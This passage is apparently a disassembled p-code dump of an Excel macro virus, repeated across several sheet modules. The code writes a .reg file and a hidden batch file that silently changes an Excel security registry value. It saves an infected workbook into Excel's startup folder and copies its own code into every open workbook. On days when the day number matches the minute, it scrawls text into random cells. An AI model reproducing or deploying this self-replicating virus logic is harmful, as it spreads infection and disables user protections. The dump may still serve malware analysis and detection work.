' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St Weins2 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld Weins2 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	IfBlock 
' Line #29:
' 	GoTo out 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	Label out 
' Line #35:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitVarSpecial (True)
' 	St PXLS 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld running 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #39:
' 	LitVarSpecial (True)
' 	St running 
' Line #40:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #43:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #44:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x0019 "Public running As Boolean"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #48:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St Weins2 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #50:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld Weins2 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #52:
' 	LitStr 0x0019 "Public running As Boolean"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #58:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #59:
' 	LitStr 0x000A "c:\tb6.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #62:
' 	ArgsCall Read 0x0000 
' Line #63:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00C8 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ForStep 
' Line #64:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St ltr 
' Line #65:
' 	Ld ltr 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Concat 
' 	St Where 
' Line #66:
' 	Ld Where 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #67:
' 	LitStr 0x001B "-(Zou-zou-zou-zoubidaaaaa)-"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #68:
' 	Ld Where 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #69:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #70:
' 	LitStr 0x000D "Comic Sans MS"
' 	MemStWith New 
' Line #71:
' 	LitDI2 0x0008 
' 	MemStWith Size 
' Line #72:
' 	EndWith 
' Line #73:
' 	Ld ltr 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld ltr 
' 	Concat 
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #74:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #75:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #76:
' 	LitStr 0x0002 "A1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #77:
' 	LitStr 0x0027 "- Y'a un bug, mais c'est pas grave... -"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #78:
' 	LitStr 0x0003 "A:A"
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	EndSub 
' Line #81:
' _VBA_PROJECT_CUR/VBA/Sheet2 - 5612 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn running (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x000A "c:\tb6.reg"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0007 "TB6.REG"
' 	Ne 
' 	LitStr 0x000A "c:\tb6.bat"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0007 "TB6.BAT"
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #4:
' 	LitStr 0x000A "c:\tb6.reg"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #5:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #6:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
' 	PrintItemNL 
' Line #7:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #8:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #9:
' 	LitStr 0x000A "c:\tb6.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "regedit /s c:\tb6.reg"
' 	PrintItemNL 
' Line #11:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #14:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #15:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	IfBlock 
' Line #19:
' 	GoTo out 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St Weins2 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld Weins2 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	IfBlock 
' Line #29:
' 	GoTo out 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	Label out 
' Line #35:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitVarSpecial (True)
' 	St PXLS 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld running 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #39:
' 	LitVarSpecial (True)
' 	St running 
' Line #40:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #43:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #44:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x0019 "Public running As Boolean"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #48:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St Weins2 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #50:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld Weins2 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #52:
' 	LitStr 0x0019 "Public running As Boolean"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #58:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #59:
' 	LitStr 0x000A "c:\tb6.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #62:
' 	ArgsCall Read 0x0000 
' Line #63:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00C8 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ForStep 
' Line #64:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St ltr 
' Line #65:
' 	Ld ltr 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Concat 
' 	St Where 
' Line #66:
' 	Ld Where 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #67:
' 	LitStr 0x001B "-(Zou-zou-zou-zoubidaaaaa)-"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #68:
' 	Ld Where 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #69:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #70:
' 	LitStr 0x000D "Comic Sans MS"
' 	MemStWith New 
' Line #71:
' 	LitDI2 0x0008 
' 	MemStWith Size 
' Line #72:
' 	EndWith 
' Line #73:
' 	Ld ltr 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld ltr 
' 	Concat 
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #74:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #75:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #76:
' 	LitStr 0x0002 "A1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #77:
' 	LitStr 0x0027 "- Y'a un bug, mais c'est pas grave... -"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #78:
' 	LitStr 0x0003 "A:A"
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	EndSub 
' Line #81:
' _VBA_PROJECT_CUR/VBA/Sheet3 - 5612 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn running (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x000A "c:\tb6.reg"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0007 "TB6.REG"
' 	Ne 
' 	LitStr 0x000A "c:\tb6.bat"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0007 "TB6.BAT"
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #4:
' 	LitStr 0x000A "c:\tb6.reg"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #5:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #6:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
' 	PrintItemNL 
' Line #7:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #8:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #9:
' 	LitStr 0x000A "c:\tb6.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "regedit /s c:\tb6.reg"
' 	PrintItemNL 
' Line #11:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #14:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #15:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	IfBlock 
' Line #19:
' 	GoTo out 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St Weins2 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld Weins2 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	IfBlock 
' Line #29:
' 	GoTo out 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	Label out 
' Line #35:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitVarSpecial (True)
' 	St PXLS 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld running 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #39:
' 	LitVarSpecial (True)
' 	St running 
' Line #40:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #43:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #44:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x0019 "Public running As Boolean"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #48:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St Weins2 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #50:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld Weins2 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #52:
' 	LitStr 0x0019 "Public running As Boolean"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #57:
